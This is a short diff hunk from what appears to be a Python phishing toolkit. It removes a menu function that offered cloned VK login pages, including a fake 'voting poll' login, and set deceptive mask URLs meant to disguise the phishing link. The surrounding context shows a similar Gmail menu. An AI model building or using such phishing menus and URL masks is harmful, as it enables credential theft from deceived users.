@@ -743,31 +743,6 @@ def site_gmail():
         os.system("cls" if os.name == "nt" else "clear")
         banner_small()
         site_gmail()
-
-
-def site_vk():
-    global website, mask
-    print(f"""
-{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
-{DARK}[{WHITE}02{DARK}]{LIGHT2} Advanced Voting Poll Login Page
-""")
-    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
-    if reply in ["1", "01"]:
-        website = "vk"
-        mask = "https://vk-premium-real-method-2020"
-        tunnel_menu()
-    elif reply in ["2", "02"]:
-        website = "vk_poll"
-        mask = "https://vote-for-the-best-social-media"
-        tunnel_menu()
-    else:
-        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
-        time.sleep(1)
-        os.system("cls" if os.name == "nt" else "clear")
-        banner_small()
-        site_vk()
-
-
 def main_menu():
     global website, mask
     os.system("cls" if os.name == "nt" else "clear")
